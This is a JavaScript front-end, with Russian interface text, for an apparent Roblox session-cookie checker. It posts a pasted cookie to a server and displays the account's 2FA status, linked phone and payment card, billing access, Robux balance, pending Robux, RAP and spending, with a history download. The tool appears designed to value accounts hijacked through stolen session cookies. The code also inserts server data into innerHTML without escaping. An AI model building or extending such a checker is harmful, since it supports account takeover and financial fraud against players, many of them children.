document.addEventListener('DOMContentLoaded', function() {
    // Инициализация частиц
    particlesJS('particles-js', {
        particles: {
            number: { value: 80, density: { enable: true, value_area: 800 } },
            color: { value: "#ffffff" },
            shape: { type: "circle" },
            opacity: { value: 0.5, random: true },
            size: { value: 3, random: true },
            line_linked: {
                enable: true,
                distance: 150,
                color: "#ffffff",
                opacity: 0.2,
                width: 1
            },
            move: {
                enable: true,
                speed: 2,
                direction: "none",
                random: true,
                straight: false,
                out_mode: "out",
                bounce: false
            }
        },
        interactivity: {
            detect_on: "canvas",
            events: {
                onhover: { enable: true, mode: "repulse" },
                onclick: { enable: true, mode: "push" },
                resize: true
            }
        }
    });

    const checkButton = document.getElementById('checkButton');
    const cookieInput = document.getElementById('cookieInput');
    const resultSection = document.getElementById('resultSection');
    const errorSection = document.getElementById('errorSection');

    checkButton.addEventListener('click', checkCookie);

    async function checkCookie() {
        const cookie = cookieInput.value.trim();
        
        if (!cookie) {
            showError('Пожалуйста, введите куки');
            return;
        }

        showLoading(true);
        hideResults();

        try {
            const response = await fetch('/check_cookie', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ cookie: cookie })
            });

            const result = await response.json();

            if (result.error) {
                showError(result.error);
            } else {
                displayResults(result);
            }
        } catch (error) {
            showError('Ошибка соединения: ' + error.message);
        } finally {
            showLoading(false);
        }
    }

    function displayResults(data) {
        // Основная информация
        document.getElementById('basicInfo').innerHTML = `
            <div class="info-item">
                <span>👤 Имя пользователя:</span>
                <span>${data.username || 'Неизвестно'}</span>
            </div>
            <div class="info-item">
                <span>🆔 ID аккаунта:</span>
                <span>${data.account_id || 'Неизвестно'}</span>
            </div>
            <div class="info-item">
                <span>📅 Дата создания:</span>
                <span>${data.account_created || 'Неизвестно'}</span>
            </div>
            <div class="info-item">
                <span>🔗 Ссылка на профиль:</span>
                <a href="${data.profile_link}" target="_blank" style="color: #48dbfb;">Открыть</a>
            </div>
        `;

        // Безопасность
        document.getElementById('securityInfo').innerHTML = `
            <div class="info-item">
                <span>🛡️ 2FA:</span>
                <span class="status ${data['2fa'] ? 'positive' : 'negative'}">
                    ${data['2fa'] ? 'Включено' : 'Выключено'}
                </span>
            </div>
            <div class="info-item">
                <span>📱 Телефон:</span>
                <span class="status ${data.phone ? 'positive' : 'negative'}">
                    ${data.phone ? 'Привязан' : 'Не привязан'}
                </span>
            </div>
            <div class="info-item">
                <span>💳 Карта:</span>
                <span class="status ${data.card ? 'positive' : 'negative'}">
                    ${data.card ? 'Привязана' : 'Не привязана'}
                </span>
            </div>
            <div class="info-item">
                <span>💰 Billing:</span>
                <span class="status ${data.card ? 'positive' : 'negative'}">
                    ${data.card ? 'Доступен' : 'Не доступен'}
                </span>
            </div>
        `;

        // Экономика
        document.getElementById('economyInfo').innerHTML = `
            <div class="info-item">
                <span>💎 Баланс Robux:</span>
                <span style="color: #feca57; font-weight: bold;">${data.balance || 0}</span>
            </div>
            <div class="info-item">
                <span>⏳ Pending Robux:</span>
                <span>${data.pending_robux || 0}</span>
            </div>
            <div class="info-item">
                <span>👑 Premium:</span>
                <span class="status ${data.premium ? 'positive' : 'negative'}">
                    ${data.premium ? 'Активен' : 'Не активен'}
                </span>
            </div>
            <div class="info-item">
                <span>🎨 RAP:</span>
                <span class="status ${data.rap ? 'positive' : 'negative'}">
                    ${data.rap ? 'Есть' : 'Нет'}
                </span>
            </div>
            <div class="info-item">
                <span>🏢 Group Pending:</span>
                <span>${data.pending_group_robux || 0}</span>
            </div>
            <div class="info-item">
                <span>💸 Всего потрачено:</span>
                <span>${data.total_spent || 0} Robux</span>
            </div>
        `;

        // Сохраняем check_id для скачивания
        if (data.check_id) {
            document.getElementById('downloadBtn').onclick = () => {
                window.location.href = `/download_history/${data.check_id}`;
            };
        }

        resultSection.classList.remove('hidden');
        errorSection.classList.add('hidden');
    }

    function showError(message) {
        document.getElementById('errorMessage').textContent = message;
        errorSection.classList.remove('hidden');
        resultSection.classList.add('hidden');
    }

    function hideResults() {
        resultSection.classList.add('hidden');
        errorSection.classList.add('hidden');
    }

    function showLoading(show) {
        const btnText = checkButton.querySelector('.btn-text');
        const loader = checkButton.querySelector('.btn-loader');
        
        if (show) {
            btnText.style.display = 'none';
            loader.style.display = 'block';
            checkButton.disabled = true;
        } else {
            btnText.style.display = 'block';
            loader.style.display = 'none';
            checkButton.disabled = false;
        }
    }
});